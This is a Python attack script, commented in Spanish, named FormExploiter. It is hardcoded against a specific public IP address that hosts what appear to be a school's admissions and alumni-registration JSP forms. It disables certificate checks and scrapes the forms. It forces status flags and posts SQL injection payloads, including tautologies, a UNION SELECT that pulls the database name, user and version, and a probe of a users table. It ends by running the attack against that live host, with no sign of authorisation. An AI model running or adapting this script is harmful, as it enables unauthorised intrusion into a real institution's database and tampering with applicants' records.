import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FormExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_interesado_forms(self):
        """Explota los formularios de proceso_interesado.jsp"""
        print("[*] Explotando formularios de interesado...")
        
        urls = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D", 
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp"
        ]
        
        for url in urls:
            try:
                full_url = f"{self.base_url}{url}"
                print(f"\n[*] Analizando: {url}")
                
                # Obtener el formulario
                response = self.session.get(full_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form')
                
                if form:
                    # Extraer todos los campos
                    all_inputs = form.find_all('input')
                    form_data = {}
                    
                    for inp in all_inputs:
                        name = inp.get('name')
                        value = inp.get('value', '')
                        input_type = inp.get('type', 'text')
                        
                        if name:
                            form_data[name] = value
                            print(f"    Campo: {name} = {value} ({input_type})")
                    
                    # Probar envío del formulario con datos manipulados
                    self.test_form_submission(full_url, form_data, form.get('action', ''))
                    
            except Exception as e:
                print(f"[-] Error: {e}")

    def test_form_submission(self, url, form_data, action):
        """Prueba el envío del formulario con datos manipulados"""
        print(f"    [+] Probando envío de formulario...")
        
        # Manipular datos críticos
        if 'yInteresado' in form_data:
            form_data['yInteresado'] = '1'  # Forzar a interesado=true
        
        if 'yEncuestado' in form_data:
            form_data['yEncuestado'] = '1'  # Forzar a encuestado=true
            
        # Añadir campos de SQL injection
        sql_fields = ['xNombre', 'xApellido', 'xEmail', 'xTelefono']
        for field in sql_fields:
            if field not in form_data:
                form_data[field] = "test' OR '1'='1"
        
        try:
            # Determinar URL de destino
            if action.startswith('/'):
                target_url = f"{self.base_url}{action}"
            elif action:
                target_url = f"{self.base_url}/jsp/escolar/proceso_admision/{action}"
            else:
                target_url = url.split('?')[0]  # Usar URL base sin parámetros
            
            response = self.session.post(target_url, data=form_data, timeout=10)
            
            print(f"    Status: {response.status_code}")
            
            # Buscar mensajes de error o éxito
            if 'error' in response.text.lower():
                print("    [!] Error detectado en respuesta")
            if 'éxito' in response.text.lower() or 'exito' in response.text.lower():
                print("    [!] ¡Posible éxito en el envío!")
            
            # Guardar respuesta
            filename = f"form_response_{url.split('/')[-1]}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(response.text)
            print(f"    [+] Respuesta guardada en {filename}")
            
        except Exception as e:
            print(f"    [-] Error en envío: {e}")

    def exploit_sql_injection_in_forms(self):
        """SQL Injection específico en campos de formularios"""
        print("\n[*] SQL Injection en campos de formularios...")
        
        # Campos vulnerables encontrados
        vulnerable_fields = {
            'xUsuario': ["admin' OR '1'='1'--", "' OR '1'='1'--", "admin' UNION SELECT 1,2,3--"],
            'xNombre': ["test' OR '1'='1'--", "' UNION SELECT database(),user(),version()--"],
            'xApellido': ["sql' OR 1=1--", "' AND 1=1--"],
            'xEmail': ["test@test.com' OR '1'='1'--", "' OR EXISTS(SELECT * FROM users)--"]
        }
        
        forms_to_test = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp"
        ]
        
        for form_url in forms_to_test:
            for field, payloads in vulnerable_fields.items():
                for payload in payloads:
                    try:
                        test_data = {field: payload}
                        # Añadir campos obligatorios
                        test_data['yAccion'] = 'guardar'
                        test_data['yInteresado'] = '1'
                        
                        url = f"{self.base_url}{form_url}"
                        response = self.session.post(url, data=test_data, timeout=8)
                        
                        if "error" not in response.text.lower() and response.status_code == 200:
                            print(f"[!] Posible SQLi en {field}: {payload[:30]}...")
                            
                    except Exception as e:
                        pass

# Ejecutar explotación de formularios
form_exploiter = FormExploiter("189.254.143.102")
form_exploiter.exploit_interesado_forms()
form_exploiter.exploit_sql_injection_in_forms()